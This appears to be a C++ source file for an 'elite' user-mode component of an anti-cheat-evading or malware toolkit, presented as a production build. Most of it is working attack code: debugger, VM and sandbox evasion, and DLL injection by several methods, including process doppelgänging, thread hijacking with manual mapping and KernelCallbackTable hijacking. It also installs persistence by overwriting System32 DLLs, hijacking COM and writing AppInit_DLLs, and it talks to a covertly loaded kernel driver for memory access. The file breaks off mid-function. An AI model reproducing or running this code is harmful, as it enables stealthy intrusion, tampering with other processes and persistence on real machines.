/*
 * ELITE USER MODE - Production Build
 * ===================================
 *
 * Advanced anti-detection user mode application
 * DIRECT MEMORY INJECTION - APT/Military-Grade Stealth
 * Implements 8 unconventional injection/persistence techniques
 *
 * Communication: Direct memory access to kernel-injected buffer
 * Zero syscalls during communication - just pointer dereference
 * Target: <1% detection by commercial AC systems
 * Platform: Windows 10/11 x64
 * Build: Visual Studio 2022
 */

#include <windows.h>
#include <winternl.h>
#include <TlHelp32.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <string>
#include <vector>
#include <fstream>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")

#pragma warning(disable: 4996)

// ============================================================================
// UNDOCUMENTED NTDLL STRUCTURES
// ============================================================================

extern "C" {

// ============================================================================
// DIRECT MEMORY STRUCTURES - Matches kernel driver EXACTLY
// ============================================================================

#define SHARED_MEM_SIZE 0x1000  // 4KB direct-mapped memory

// The "Whiteboard" - kernel allocates this, maps it into our process
typedef struct _SHARED_MEMORY {
    volatile LONG CommandID;    // 0 = Idle, 1 = Ping, 2 = GetHWID, etc.
    volatile LONG Status;       // 0 = Pending, 1 = Success, 2 = Error
    volatile ULONGLONG HardwareId;  // Hardware ID for verification
    volatile ULONG ProcessId;   // Target process ID
    volatile PVOID Address;     // Target address for memory operations
    volatile SIZE_T Size;       // Size of data
    volatile ULONG Protection;  // Memory protection flags
    volatile UCHAR Data[3072];  // Inline buffer for data transfer
} SHARED_MEMORY, *PSHARED_MEMORY;

// Command IDs - MUST match kernel driver
#define CMD_IDLE            0
#define CMD_PING            1
#define CMD_GET_HWID        2
#define CMD_READ_MEMORY     3
#define CMD_WRITE_MEMORY    4
#define CMD_PROTECT_MEMORY  5
#define CMD_ALLOC_MEMORY    6

// Status codes - MUST match kernel driver
#define STATUS_PENDING      0
#define STATUS_SUCCESS      1
#define STATUS_ERROR        2

// Transaction APIs
NTSTATUS NTAPI NtCreateTransaction(
    _Out_ PHANDLE TransactionHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_opt_ LPGUID Uow,
    _In_opt_ HANDLE TmHandle,
    _In_opt_ ULONG CreateOptions,
    _In_opt_ ULONG IsolationLevel,
    _In_opt_ ULONG IsolationFlags,
    _In_opt_ PLARGE_INTEGER Timeout,
    _In_opt_ PUNICODE_STRING Description
);

NTSTATUS NTAPI NtRollbackTransaction(
    _In_ HANDLE TransactionHandle,
    _In_ BOOLEAN Wait
);

// Section APIs
NTSTATUS NTAPI NtCreateSection(
    _Out_ PHANDLE SectionHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_opt_ PLARGE_INTEGER MaximumSize,
    _In_ ULONG SectionPageProtection,
    _In_ ULONG AllocationAttributes,
    _In_opt_ HANDLE FileHandle
);

// Process APIs
NTSTATUS NTAPI NtCreateProcessEx(
    _Out_ PHANDLE ProcessHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ HANDLE ParentProcess,
    _In_ ULONG Flags,
    _In_opt_ HANDLE SectionHandle,
    _In_opt_ HANDLE DebugPort,
    _In_opt_ HANDLE ExceptionPort,
    _In_ BOOLEAN InJob
);

} // extern "C"

// ============================================================================
// EVASION - Anti-Debugging & Anti-Analysis
// ============================================================================

class EvasionTechniques {
public:
    // Check for debugger presence
    static bool IsDebuggerActive() {
        if (IsDebuggerPresent()) return true;

        BOOL remoteDebugger = FALSE;
        CheckRemoteDebuggerPresent(GetCurrentProcess(), &remoteDebugger);
        if (remoteDebugger) return true;

        // Check PEB BeingDebugged flag manually
        PPEB peb = (PPEB)__readgsqword(0x60);
        if (peb->BeingDebugged) return true;

        // NtGlobalFlag check (0x70 in PEB)
        DWORD ntGlobalFlag = *(PDWORD)((ULONG_PTR)peb + 0xBC);
        if (ntGlobalFlag & 0x70) return true; // FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS

        return false;
    }

    // VM detection via CPUID
    static bool IsVirtualMachine() {
        int cpuInfo[4] = {0};
        __cpuid(cpuInfo, 1);

        // Check hypervisor bit (ECX bit 31)
        if (cpuInfo[2] & (1 << 31)) return true;

        // Check for VM vendor strings
        __cpuid(cpuInfo, 0x40000000);
        char vendor[13] = {0};
        memcpy(vendor, &cpuInfo[1], 4);
        memcpy(vendor + 4, &cpuInfo[2], 4);
        memcpy(vendor + 8, &cpuInfo[3], 4);

        if (strstr(vendor, "VMware") || strstr(vendor, "VBoxVBox") ||
            strstr(vendor, "KVMKVMKVM") || strstr(vendor, "Microsoft Hv")) {
            return true;
        }

        return false;
    }

    // Sandbox detection via timing
    static bool IsSandbox() {
        DWORD startTime = GetTickCount();
        Sleep(500);
        DWORD endTime = GetTickCount();

        // Sandboxes often skip sleeps
        if ((endTime - startTime) < 450) return true;

        // Check for low uptime (fresh VM)
        if (GetTickCount() < 600000) return true; // Less than 10 minutes uptime

        return false;
    }

    // String obfuscation via XOR
    static std::string DecryptString(const char* encrypted, size_t len, BYTE key) {
        std::string result(len, 0);
        for (size_t i = 0; i < len; i++) {
            result[i] = encrypted[i] ^ key;
        }
        return result;
    }
};

// ============================================================================
// TECHNIQUE 9: SIMPLE LOADLIBRARY INJECTION (Stable, for testing)
// ============================================================================

class SimpleInjector {
public:
    static bool InjectDLL(DWORD targetPid, const wchar_t* dllPath) {
        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
        if (!hProcess) return false;

        SIZE_T pathSize = (wcslen(dllPath) + 1) * sizeof(wchar_t);
        PVOID pRemotePath = VirtualAllocEx(hProcess, nullptr, pathSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

        if (!pRemotePath) {
            CloseHandle(hProcess);
            return false;
        }

        if (!WriteProcessMemory(hProcess, pRemotePath, dllPath, pathSize, nullptr)) {
            VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }

        HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
        FARPROC pLoadLibraryW = GetProcAddress(hKernel32, "LoadLibraryW");

        HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0,
            (LPTHREAD_START_ROUTINE)pLoadLibraryW, pRemotePath, 0, nullptr);

        if (!hThread) {
            VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }

        WaitForSingleObject(hThread, INFINITE);

        CloseHandle(hThread);
        VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
        CloseHandle(hProcess);

        return true;
    }
};

// ============================================================================
// MANUAL MAP STRUCTURES
// ============================================================================

#pragma pack(push, 1)
typedef struct _MANUAL_MAP_DATA {
    PVOID ImageBase;
    PIMAGE_NT_HEADERS NtHeaders;
    PIMAGE_BASE_RELOCATION BaseReloc;
    PIMAGE_IMPORT_DESCRIPTOR ImportDesc;
    decltype(&LoadLibraryA) fnLoadLibraryA;
    decltype(&GetProcAddress) fnGetProcAddress;
    decltype(&VirtualProtect) fnVirtualProtect;
} MANUAL_MAP_DATA, *PMANUAL_MAP_DATA;
#pragma pack(pop)

// ============================================================================
// TECHNIQUE 1: PROCESS DOPPELGÄNGING
// ============================================================================

class ProcessDoppelganger {
public:
    static HANDLE CreateDoppelgangerProcess(const wchar_t* targetImage, void* payloadData, size_t payloadSize) {
        std::wstring tempPath = L"C:\\Windows\\Temp\\";
        tempPath += targetImage;

        HANDLE hTransaction = nullptr;
        NTSTATUS status = NtCreateTransaction(
            &hTransaction,
            TRANSACTION_ALL_ACCESS,
            nullptr, nullptr, nullptr,
            0, 0, 0, nullptr, nullptr
        );

        if (!NT_SUCCESS(status)) return nullptr;

        HANDLE hFile = CreateFileTransactedW(
            tempPath.c_str(),
            GENERIC_READ | GENERIC_WRITE,
            0, nullptr,
            CREATE_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            nullptr,
            hTransaction,
            nullptr, nullptr
        );

        if (hFile == INVALID_HANDLE_VALUE) {
            NtRollbackTransaction(hTransaction, TRUE);
            CloseHandle(hTransaction);
            return nullptr;
        }

        DWORD written = 0;
        WriteFile(hFile, payloadData, (DWORD)payloadSize, &written, nullptr);

        HANDLE hSection = nullptr;
        status = NtCreateSection(
            &hSection,
            SECTION_ALL_ACCESS,
            nullptr, nullptr,
            PAGE_READONLY,
            SEC_IMAGE,
            hFile
        );

        CloseHandle(hFile);

        if (!NT_SUCCESS(status)) {
            NtRollbackTransaction(hTransaction, TRUE);
            CloseHandle(hTransaction);
            return nullptr;
        }

        HANDLE hProcess = nullptr;
        status = NtCreateProcessEx(
            &hProcess,
            PROCESS_ALL_ACCESS,
            nullptr,
            GetCurrentProcess(),
            0,
            hSection,
            nullptr, nullptr,
            FALSE
        );

        CloseHandle(hSection);
        NtRollbackTransaction(hTransaction, TRUE);
        CloseHandle(hTransaction);

        if (!NT_SUCCESS(status)) return nullptr;

        return hProcess;
    }
};

// ============================================================================
// TECHNIQUE 2: THREAD HIJACKING WITH MANUAL MAP
// ============================================================================

__declspec(noinline) DWORD WINAPI ManualMapShellcode(PMANUAL_MAP_DATA pData) {
    if (!pData) return 1;

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pData->ImageBase;
    PIMAGE_NT_HEADERS pNtHeaders = pData->NtHeaders;

    // Fix imports
    if (pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size) {
        PIMAGE_IMPORT_DESCRIPTOR pImportDesc = pData->ImportDesc;

        while (pImportDesc->Name) {
            char* szMod = (char*)((ULONG_PTR)pData->ImageBase + pImportDesc->Name);
            HMODULE hDll = pData->fnLoadLibraryA(szMod);

            PIMAGE_THUNK_DATA pThunkRef = (PIMAGE_THUNK_DATA)((ULONG_PTR)pData->ImageBase + pImportDesc->OriginalFirstThunk);
            PIMAGE_THUNK_DATA pFuncRef = (PIMAGE_THUNK_DATA)((ULONG_PTR)pData->ImageBase + pImportDesc->FirstThunk);

            if (!pThunkRef) pThunkRef = pFuncRef;

            for (; pThunkRef->u1.AddressOfData; ++pThunkRef, ++pFuncRef) {
                if (IMAGE_SNAP_BY_ORDINAL(pThunkRef->u1.Ordinal)) {
                    pFuncRef->u1.Function = (ULONG_PTR)pData->fnGetProcAddress(hDll, (LPCSTR)(pThunkRef->u1.Ordinal & 0xFFFF));
                } else {
                    PIMAGE_IMPORT_BY_NAME pImport = (PIMAGE_IMPORT_BY_NAME)((ULONG_PTR)pData->ImageBase + pThunkRef->u1.AddressOfData);
                    pFuncRef->u1.Function = (ULONG_PTR)pData->fnGetProcAddress(hDll, pImport->Name);
                }
            }
            ++pImportDesc;
        }
    }

    // Fix relocations
    if (pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size) {
        PIMAGE_BASE_RELOCATION pRelocData = pData->BaseReloc;
        ULONG_PTR delta = (ULONG_PTR)pData->ImageBase - pNtHeaders->OptionalHeader.ImageBase;

        while (pRelocData->VirtualAddress) {
            UINT AmountOfEntries = (pRelocData->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            WORD* pRelativeInfo = (WORD*)(pRelocData + 1);

            for (UINT i = 0; i < AmountOfEntries; ++i, ++pRelativeInfo) {
                if ((*pRelativeInfo >> 12) == IMAGE_REL_BASED_DIR64) {
                    ULONG_PTR* pPatch = (ULONG_PTR*)((ULONG_PTR)pData->ImageBase + pRelocData->VirtualAddress + (*pRelativeInfo & 0xFFF));
                    *pPatch += delta;
                }
            }

            pRelocData = (PIMAGE_BASE_RELOCATION)((ULONG_PTR)pRelocData + pRelocData->SizeOfBlock);
        }
    }

    // Set memory protections
    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
    for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; ++i, ++pSectionHeader) {
        DWORD dwProtect = PAGE_READONLY;

        if (pSectionHeader->Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            dwProtect = PAGE_EXECUTE_READ;
        } else if (pSectionHeader->Characteristics & IMAGE_SCN_MEM_WRITE) {
            dwProtect = PAGE_READWRITE;
        }

        DWORD dwOld;
        pData->fnVirtualProtect(
            (PVOID)((ULONG_PTR)pData->ImageBase + pSectionHeader->VirtualAddress),
            pSectionHeader->Misc.VirtualSize,
            dwProtect,
            &dwOld
        );
    }

    // Call DllMain
    typedef BOOL(WINAPI* DllEntryProc)(HINSTANCE, DWORD, LPVOID);
    DllEntryProc pDllMain = (DllEntryProc)((ULONG_PTR)pData->ImageBase + pNtHeaders->OptionalHeader.AddressOfEntryPoint);

    if (pDllMain) {
        pDllMain((HINSTANCE)pData->ImageBase, DLL_PROCESS_ATTACH, nullptr);
    }

    return 0;
}

__declspec(noinline) void ManualMapShellcodeEnd() { }

class ThreadHijacker {
public:
    static bool InjectViaThreadHijack(DWORD targetPid, const wchar_t* dllPath) {
        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
        if (!hProcess) return false;

        HANDLE hFile = CreateFileW(dllPath, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr);
        if (hFile == INVALID_HANDLE_VALUE) {
            CloseHandle(hProcess);
            return false;
        }

        DWORD fileSize = GetFileSize(hFile, nullptr);
        std::vector<BYTE> dllData(fileSize);
        DWORD read = 0;
        ReadFile(hFile, dllData.data(), fileSize, &read, nullptr);
        CloseHandle(hFile);

        PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)dllData.data();
        PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(dllData.data() + pDosHeader->e_lfanew);

        PVOID pRemoteImage = VirtualAllocEx(
            hProcess, nullptr,
            pNtHeaders->OptionalHeader.SizeOfImage,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );

        if (!pRemoteImage) {
            CloseHandle(hProcess);
            return false;
        }

        WriteProcessMemory(hProcess, pRemoteImage, dllData.data(), pNtHeaders->OptionalHeader.SizeOfHeaders, nullptr);

        PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
        for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; ++i, ++pSectionHeader) {
            WriteProcessMemory(
                hProcess,
                (PVOID)((ULONG_PTR)pRemoteImage + pSectionHeader->VirtualAddress),
                dllData.data() + pSectionHeader->PointerToRawData,
                pSectionHeader->SizeOfRawData,
                nullptr
            );
        }

        SIZE_T shellcodeSize = (ULONG_PTR)ManualMapShellcodeEnd - (ULONG_PTR)ManualMapShellcode;
        PVOID pShellcode = VirtualAllocEx(hProcess, nullptr, shellcodeSize + sizeof(MANUAL_MAP_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

        if (!pShellcode) {
            VirtualFreeEx(hProcess, pRemoteImage, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }

        MANUAL_MAP_DATA mapData = { 0 };
        mapData.ImageBase = pRemoteImage;
        mapData.NtHeaders = (PIMAGE_NT_HEADERS)((ULONG_PTR)pRemoteImage + pDosHeader->e_lfanew);
        mapData.BaseReloc = (PIMAGE_BASE_RELOCATION)((ULONG_PTR)pRemoteImage + pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
        mapData.ImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((ULONG_PTR)pRemoteImage + pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

        HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
        mapData.fnLoadLibraryA = (decltype(&LoadLibraryA))GetProcAddress(hKernel32, "LoadLibraryA");
        mapData.fnGetProcAddress = (decltype(&GetProcAddress))GetProcAddress(hKernel32, "GetProcAddress");
        mapData.fnVirtualProtect = (decltype(&VirtualProtect))GetProcAddress(hKernel32, "VirtualProtect");

        WriteProcessMemory(hProcess, pShellcode, (PVOID)ManualMapShellcode, shellcodeSize, nullptr);
        WriteProcessMemory(hProcess, (PVOID)((ULONG_PTR)pShellcode + shellcodeSize), &mapData, sizeof(mapData), nullptr);

        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) {
            VirtualFreeEx(hProcess, pRemoteImage, 0, MEM_RELEASE);
            VirtualFreeEx(hProcess, pShellcode, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }

        THREADENTRY32 te = { sizeof(THREADENTRY32) };
        HANDLE hThread = nullptr;

        if (Thread32First(hSnapshot, &te)) {
            do {
                if (te.th32OwnerProcessID == targetPid) {
                    hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
                    if (hThread) break;
                }
            } while (Thread32Next(hSnapshot, &te));
        }

        CloseHandle(hSnapshot);

        if (!hThread) {
            VirtualFreeEx(hProcess, pRemoteImage, 0, MEM_RELEASE);
            VirtualFreeEx(hProcess, pShellcode, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }

        SuspendThread(hThread);

        CONTEXT ctx = { 0 };
        ctx.ContextFlags = CONTEXT_FULL;
        GetThreadContext(hThread, &ctx);

        ctx.Rsp -= sizeof(ULONG_PTR);
        WriteProcessMemory(hProcess, (PVOID)ctx.Rsp, &ctx.Rip, sizeof(ULONG_PTR), nullptr);

        ctx.Rip = (ULONG_PTR)pShellcode;
        ctx.Rcx = (ULONG_PTR)pShellcode + shellcodeSize;

        SetThreadContext(hThread, &ctx);
        ResumeThread(hThread);

        CloseHandle(hThread);
        CloseHandle(hProcess);

        return true;
    }
};

// ============================================================================
// TECHNIQUE 3: DIRECT MEMORY CLIENT - APT/Military-Grade Stealth
// ============================================================================
// Kernel forcibly mapped memory into our process
// We just read pointer from registry and use it - ZERO syscalls!

class DirectMemoryClient {
private:
    PSHARED_MEMORY m_pShared = nullptr;  // Direct pointer to kernel memory
    ULONGLONG m_hardwareId = 0;

public:
    bool Connect() {
        #ifdef _DEBUG
        printf("[*] Attempting to connect to kernel driver...\n");
        printf("[*] Current PID: %d\n", GetCurrentProcessId());
        #endif

        // Signal kernel by writing our PID to registry
        HKEY hKey = nullptr;
        LONG result = RegCreateKeyExW(
            HKEY_LOCAL_MACHINE,
            L"SOFTWARE\\AudioKSE",
            0,
            nullptr,
            REG_OPTION_NON_VOLATILE,
            KEY_WRITE | KEY_READ,
            nullptr,
            &hKey,
            nullptr
        );

        if (result != ERROR_SUCCESS) {
            #ifdef _DEBUG
            printf("[-] Failed to create/open registry key (error: %d)\n", result);
            printf("[!] Try running as Administrator\n");
            #endif
            return false;
        }

        DWORD pid = GetCurrentProcessId();
        result = RegSetValueExW(
            hKey,
            L"RequestPID",
            0,
            REG_DWORD,
            (BYTE*)&pid,
            sizeof(DWORD)
        );

        RegCloseKey(hKey);

        if (result != ERROR_SUCCESS) {
            #ifdef _DEBUG
            printf("[-] Failed to write PID to registry (error: %d)\n", result);
            #endif
            return false;
        }

        #ifdef _DEBUG
        printf("[+] Wrote connection request to registry\n");
        printf("[*] Waiting for kernel to inject memory...\n");
        #endif

        // Step 2: Wait for kernel to inject memory and write pointer
        for (int retry = 0; retry < 20; retry++) {
            if (retry > 0) {
                Sleep(500); // Wait 500ms between retries
            }

            result = RegOpenKeyExW(
                HKEY_LOCAL_MACHINE,
                L"SOFTWARE\\AudioKSE",
                0,
                KEY_READ,
                &hKey
            );

            if (result != ERROR_SUCCESS) {
                continue;
            }

            PVOID pointer = nullptr;
            DWORD dataSize = sizeof(PVOID);
            DWORD type = REG_BINARY;

            result = RegQueryValueExW(
                hKey,
                L"DiagnosticBuffer",
                nullptr,
                &type,
                (LPBYTE)&pointer,
                &dataSize
            );

            RegCloseKey(hKey);

            if (result != ERROR_SUCCESS || !pointer) {
                continue;
            }

            #ifdef _DEBUG
            printf("[+] Found kernel memory pointer: 0x%p\n", pointer);
            #endif

            // Cast to our structure - this is the kernel memory!
            m_pShared = (PSHARED_MEMORY)pointer;

            // Verify it's valid by reading hardware ID
            __try {
                m_hardwareId = m_pShared->HardwareId;
                #ifdef _DEBUG
                printf("[+] Hardware ID from kernel: 0x%llX\n", m_hardwareId);
                #endif
            }
            __except (EXCEPTION_EXECUTE_HANDLER) {
                #ifdef _DEBUG
                printf("[-] Failed to read from mapped memory (access violation)\n");
                #endif
                m_pShared = nullptr;
                continue;
            }

            // Test communication with ping
            #ifdef _DEBUG
            printf("[*] Testing communication with ping command...\n");
            #endif

            if (!SendCommand(CMD_PING)) {
                #ifdef _DEBUG
                printf("[-] Ping command failed\n");
                #endif
                m_pShared = nullptr;
                continue;
            }

            #ifdef _DEBUG
            printf("[+] Ping successful - connection established!\n");
            #endif

            return true;
        }

        #ifdef _DEBUG
        printf("[-] Failed to connect after 20 retries (10 seconds)\n");
        printf("[!] Make sure:\n");
        printf("    1. Driver is loaded (via KDMapper or sc start)\n");
        printf("    2. Running as Administrator\n");
        printf("    3. Check DbgView for kernel debug output\n");
        #endif

        return false;
    }

    void Disconnect() {
        // Nothing to disconnect - we just stop using the pointer
        m_pShared = nullptr;
    }

    bool SendCommand(LONG cmdId) {
        if (!m_pShared) return false;

        #ifdef _DEBUG
        printf("[*] Sending command %d to kernel...\n", cmdId);
        #endif

        // Write command to shared memory - ZERO SYSCALLS!
        __try {
            m_pShared->CommandID = cmdId;
            m_pShared->Status = STATUS_PENDING;
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            #ifdef _DEBUG
            printf("[-] Access violation writing command\n");
            #endif
            return false;
        }

        // Wait for kernel to process command
        // Kernel worker sleeps 10us between checks, so give it time
        for (int i = 0; i < 100; i++) { // 100ms total (1ms * 100)
            if (m_pShared->CommandID == CMD_IDLE) {
                break;
            }
            Sleep(1); // 1ms sleep
        }

        if (m_pShared->CommandID != CMD_IDLE) {
            #ifdef _DEBUG
            printf("[-] Timeout waiting for kernel response\n");
            #endif
            return false;
        }

        // Check if command completed
        bool success = (m_pShared->Status == STATUS_SUCCESS);

        #ifdef _DEBUG
        if (success) {
            printf("[+] Command completed successfully (status: %d)\n", m_pShared->Status);
        } else {
            printf("[-] Command failed (status: %d)\n", m_pShared->Status);
        }
        #endif

        return success;
    }

    ULONGLONG GetHardwareId() const { return m_hardwareId; }
    PSHARED_MEMORY GetSharedMemory() const { return m_pShared; }
};

// ============================================================================
// TECHNIQUE 4: DLL ORDER HIJACKING
// ============================================================================

class DllOrderHijacker {
public:
    static bool InstallOrderHijack(const wchar_t* targetDll, const wchar_t* ourDll) {
        WCHAR system32Path[MAX_PATH];
        GetSystemDirectoryW(system32Path, MAX_PATH);

        std::wstring destPath = system32Path;
        destPath += L"\\";
        destPath += targetDll;

        WCHAR backupPath[MAX_PATH];
        wcscpy_s(backupPath, destPath.c_str());
        wcscat_s(backupPath, L".bak");

        if (PathFileExistsW(destPath.c_str())) {
            MoveFileExW(destPath.c_str(), backupPath, MOVEFILE_REPLACE_EXISTING);
        }

        if (!CopyFileW(ourDll, destPath.c_str(), FALSE)) {
            return false;
        }

        return true;
    }

    static bool HijackVersionDll() {
        WCHAR ourPath[MAX_PATH];
        GetModuleFileNameW(nullptr, ourPath, MAX_PATH);
        return InstallOrderHijack(L"version.dll", ourPath);
    }

    static bool HijackWinmmDll() {
        WCHAR ourPath[MAX_PATH];
        GetModuleFileNameW(nullptr, ourPath, MAX_PATH);
        return InstallOrderHijack(L"winmm.dll", ourPath);
    }
};

// ============================================================================
// TECHNIQUE 5: KERNELCALLBACKTABLE HIJACKING
// ============================================================================

class KernelCallbackTableHijacker {
public:
    static bool HijackCallbackTable(DWORD targetPid, PVOID shellcode, SIZE_T shellcodeSize) {
        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
        if (!hProcess) return false;

        typedef NTSTATUS (NTAPI *pfnNtQueryInformationProcess)(
            HANDLE ProcessHandle,
            DWORD ProcessInformationClass,
            PVOID ProcessInformation,
            ULONG ProcessInformationLength,
            PULONG ReturnLength
        );

        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        pfnNtQueryInformationProcess NtQueryInformationProcess =
            (pfnNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");

        if (!NtQueryInformationProcess) {
            CloseHandle(hProcess);
            return false;
        }

        PROCESS_BASIC_INFORMATION pbi = { 0 };
        ULONG returnLength = 0;

        NTSTATUS status = NtQueryInformationProcess(hProcess, 0, &pbi, sizeof(pbi), &returnLength);
        if (!NT_SUCCESS(status)) {
            CloseHandle(hProcess);
            return false;
        }

        // Read KernelCallbackTable pointer from PEB (offset 0x58 for x64)
        PVOID pOriginalTable = nullptr;
        SIZE_T bytesRead = 0;

        PVOID pKernelCallbackTablePtr = (PVOID)((ULONG_PTR)pbi.PebBaseAddress + 0x58);
        if (!ReadProcessMemory(hProcess, pKernelCallbackTablePtr, &pOriginalTable, sizeof(PVOID), &bytesRead)) {
            CloseHandle(hProcess);
            return false;
        }

        if (!pOriginalTable) {
            CloseHandle(hProcess);
            return false;
        }

        PVOID pFakeTable = VirtualAllocEx(hProcess, nullptr, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!pFakeTable) {
            CloseHandle(hProcess);
            return false;
        }

        BYTE originalTable[0x1000];
        ReadProcessMemory(hProcess, pOriginalTable, originalTable, sizeof(originalTable), &bytesRead);

        PVOID pRemoteShellcode = VirtualAllocEx(hProcess, nullptr, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!pRemoteShellcode) {
            VirtualFreeEx(hProcess, pFakeTable, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }

        WriteProcessMemory(hProcess, pRemoteShellcode, shellcode, shellcodeSize, nullptr);

        PVOID* fakeTable = (PVOID*)originalTable;
        fakeTable[0] = pRemoteShellcode;

        WriteProcessMemory(hProcess, pFakeTable, fakeTable, sizeof(originalTable), nullptr);

        PVOID pKernelCallbackTableOffset = (PVOID)((ULONG_PTR)pbi.PebBaseAddress + 0x58);
        WriteProcessMemory(hProcess, pKernelCallbackTableOffset, &pFakeTable, sizeof(PVOID), nullptr);

        HWND hwnd = FindWindowExA(nullptr, nullptr, nullptr, nullptr);
        if (hwnd) {
            COPYDATASTRUCT cds = { 0 };
            cds.dwData = 1;
            cds.cbData = 4;
            cds.lpData = (PVOID)"test";
            SendMessageA(hwnd, WM_COPYDATA, 0, (LPARAM)&cds);
        }

        CloseHandle(hProcess);
        return true;
    }
};

// ============================================================================
// TECHNIQUE 6: TLS CALLBACK ABUSE
// ============================================================================

void NTAPI TlsCallback(PVOID DllHandle, DWORD Reason, PVOID Reserved) {
    if (Reason == DLL_PROCESS_ATTACH) {
        #ifdef _DEBUG
        OutputDebugStringA("[ELITE] TLS callback executed before main!\n");
        #endif
    }
}

#ifdef _WIN64
#pragma comment (linker, "/INCLUDE:_tls_used")
#pragma comment (linker, "/INCLUDE:tls_callback_func")
#pragma const_seg(".CRT$XLF")
EXTERN_C const PIMAGE_TLS_CALLBACK tls_callback_func = TlsCallback;
#pragma const_seg()
#else
#pragma comment (linker, "/INCLUDE:__tls_used")
#pragma comment (linker, "/INCLUDE:_tls_callback_func")
#pragma data_seg(".CRT$XLF")
EXTERN_C PIMAGE_TLS_CALLBACK tls_callback_func = TlsCallback;
#pragma data_seg()
#endif

// ============================================================================
// TECHNIQUE 7: COM HIJACKING
// ============================================================================

class ComHijacker {
public:
    static bool InstallComHijack(const wchar_t* clsid, const wchar_t* dllPath) {
        HKEY hKey;
        std::wstring keyPath = L"Software\\Classes\\CLSID\\";
        keyPath += clsid;
        keyPath += L"\\InprocServer32";

        LONG result = RegCreateKeyExW(
            HKEY_CURRENT_USER,
            keyPath.c_str(),
            0, nullptr,
            REG_OPTION_NON_VOLATILE,
            KEY_WRITE,
            nullptr,
            &hKey,
            nullptr
        );

        if (result != ERROR_SUCCESS) return false;

        result = RegSetValueExW(
            hKey,
            nullptr,
            0,
            REG_SZ,
            (BYTE*)dllPath,
            (DWORD)(wcslen(dllPath) + 1) * sizeof(wchar_t)
        );

        RegSetValueExW(hKey, L"ThreadingModel", 0, REG_SZ, (BYTE*)L"Apartment", 10 * sizeof(wchar_t));
        RegCloseKey(hKey);

        return result == ERROR_SUCCESS;
    }

    static bool HijackTaskSchedulerCom() {
        WCHAR ourPath[MAX_PATH];
        GetModuleFileNameW(nullptr, ourPath, MAX_PATH);
        return InstallComHijack(L"{0F87369F-A4E5-4CFC-BD3E-73E6154572DD}", ourPath);
    }
};

// ============================================================================
// TECHNIQUE 8: APPINIT_DLLS
// ============================================================================

class AppInitDllsInstaller {
public:
    static bool InstallAppInitDll(const wchar_t* dllPath) {
        HKEY hKey;
        LONG result = RegOpenKeyExW(
            HKEY_LOCAL_MACHINE,
            L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows",
            0,
            KEY_WRITE | KEY_READ,
            &hKey
        );

        if (result != ERROR_SUCCESS) {
            result = RegOpenKeyExW(
                HKEY_CURRENT_USER,
                L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows",
                0,
                KEY_WRITE | KEY_READ,
                &hKey
            );

            if (result != ERROR_SUCCESS) return false;
